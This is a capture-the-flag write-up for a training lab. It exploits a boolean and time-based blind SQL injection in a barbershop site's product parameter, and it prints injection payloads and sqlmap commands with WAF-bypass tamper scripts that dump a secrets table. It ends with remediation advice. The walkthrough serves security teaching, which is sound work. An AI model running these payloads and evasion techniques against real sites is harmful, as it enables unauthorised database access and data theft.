Lab: KrissCut

Category: Web Security / SQL Injection

Vulnerability: Boolean-based blind SQLi with WAF keyword filter bypass via tamper scripts

Platform: webverse

Lab Description#

Briefing

Kris has run the place since 2009. The website came later, built cheap by a cousin who “knew a bit of code” and bolted a security filter onto the catalogue after a scare. The filter looks the part — but it was written in a hurry.

Visiting the Site#

The target is a barbershop storefront — clean UI, nothing immediately suspicious.

Browsing to the SHOP section and clicking any product reveals something useful in the URL: a ?id= parameter that drives the product lookup.

There’s no visible reflection of the input on the page, so this isn’t a simple reflected injection — but the parameter is worth probing.

Confirming SQL Injection#

We swap the numeric ID for a non-existent string value test — the server returns a generic “We couldn’t find that one” message.

Adding a single quote test' produces a very different response: a raw MariaDB syntax error leaked straight to the page.

(1064, "You have an error in your SQL syntax; check the manual that
corresponds to your MariaDB server version for the right syntax to
use near ''test''' at line 1")

The backend is passing our input directly into a SQL query — the injection is confirmed.

Probing the WAF#

Boolean bypass works#

We test a classic boolean bypass: test' or 1=1-- -. The server returns a valid product, meaning the condition evaluated to true — the boolean path is open.

UNION is blocked#

A UNION SELECT probe immediately triggers the filter:

The error reads “Request blocked — Our catalog security filter flagged something in that request.” The filter is catching UNION and SELECT keywords. Various manual bypass attempts from PortSwigger’s filter-bypass reference don’t stick — the regex is specifically watching for these words.

Time-based blind also works#

We try test' AND SLEEP(3)-- -. The page hangs for roughly three seconds before returning the not-found message — confirming the injection executes asynchronously and a time-based blind path is available too.

So we have two working injection paths — boolean-based blind and time-based blind — but the WAF blocks any attempt to use UNION SELECT for direct data retrieval. We hand this over to sqlmap.

Enumerating Databases with sqlmap#

We point sqlmap at the injectable parameter, marking the injection point with *, and ask it to enumerate databases. The --random-agent flag rotates the User-Agent to reduce fingerprinting noise.

$ sqlmap -u 'https://92db9aa8-4575-krisscut-f5ec4.events.webverselabs-pro.com/product?id=test*' \
  --batch --dbs --random-agent

sqlmap confirms the back-end is MySQL and identifies the injection type as boolean-based blind (OR clause with MySQL comment). After testing, it falls back to the current database when direct enumeration hits 403 responses — and retrieves the database name:

[*] krisscut

The WAF is returning 403 Forbidden on many requests during the dump — 255 times according to the log. We need tamper scripts to get further.

Dumping Tables — WAF Bypass with Tamper Scripts#

A straight --tables run against the krisscut database hits the WAF hard — sqlmap can’t retrieve any table names and reports “No tables found” with 403s throughout:

We add three tamper scripts to mangle the payload away from the filter’s patterns:

  • space2comment — replaces spaces with /**/ to break keyword detection
  • between — rewrites comparisons using BETWEEN to avoid = scrutiny
  • randomcase — randomises keyword casing (SeLeCt, UnIoN) to defeat case-sensitive regex
$ sqlmap -u 'https://92db9aa8-4575-krisscut-f5ec4.events.webverselabs-pro.com/product?id=test*' \
  --batch --random-agent -D krisscut --tables --threads 4 \
  --tamper=space2comment,between,randomcase

Two tables surface:

Database: krisscut
[2 tables]
+----------+
| products |
| seirets  |
+----------+

seirets is clearly a typo for secrets — that’s where the flag will be.

Dumping Columns from the secrets Table#

We enumerate the columns of the seirets table (the real table name at the database level is secrets — the retrieval mismatch is a sqlmap artefact of the blind technique; guessing from context confirms it):

$ sqlmap -u 'https://92db9aa8-4575-krisscut-f5ec4.events.webverselabs-pro.com/product?id=test*' \
  --batch --random-agent -D krisscut -T secrets --columns --threads 4 \
  --tamper=space2comment,between,randomcase

+-------+-------------+
| Column | Type        |
+-------+-------------+
| value  | text        |
| id     | int(11)     |
| label  | varchar(96) |
| note   | text        |
+-------+-------------+

The value column is the obvious target.

Dumping the Flag#

We dump just the value column from the secrets table:

$ sqlmap -u 'https://92db9aa8-4575-krisscut-f5ec4.events.webverselabs-pro.com/product?id=test*' \
  --batch --random-agent -D krisscut -T secrets -C value --dump --threads 4 \
  --tamper=space2comment,between,randomcase

Database: krisscut
Table: secrets
[3 entries]

| sq0atp-PLACEHOLDER_POS_TOKEN             |

Flag captured.

Why This Works#

The vulnerability is a textbook error-based → boolean-based blind SQL injection with an incomplete WAF:

  1. Unsanitised parameter. The ?id= parameter is interpolated directly into a SQL query with no parameterisation or type enforcement.

  2. WAF blocks keywords but not logic. The filter catches UNION and SELECT as literal strings, but boolean conditions (OR 1=1) and time delays (SLEEP) pass through unchecked. Blocking keywords is not the same as preventing injection.

  3. Tamper scripts defeat the regex. Substituting spaces with /**/, randomising casing (SeLeCt), and rewriting comparisons with BETWEEN are all well-known WAF evasion techniques — the filter wasn’t written to handle them.

  4. Verbose error disclosure. The raw MariaDB error message in step one told us the exact query structure and DBMS version, dramatically reducing the effort needed to craft working payloads.

Remediation#

IssueFix
?id= interpolated directly into SQLUse prepared statements / parameterised queries — the only reliable defence against SQLi
WAF keyword filter as primary defenceWAFs are a defence-in-depth layer, not a substitute for safe query construction; parameterisation makes the WAF irrelevant
Raw SQL error messages returned to the userCatch database exceptions server-side and return a generic error; never expose DBMS internals
secrets table readable by the web DB userApply least-privilege to the database account — the web app should only have SELECT on the tables it needs, and never on sensitive tables like secrets

The takeaway

A keyword-based WAF buys time, not security. As long as the underlying query is built by concatenating user input, an attacker who knows the DBMS can find a bypass — and tools like sqlmap with tamper scripts do it automatically. Parameterise your queries. Everything else is noise.
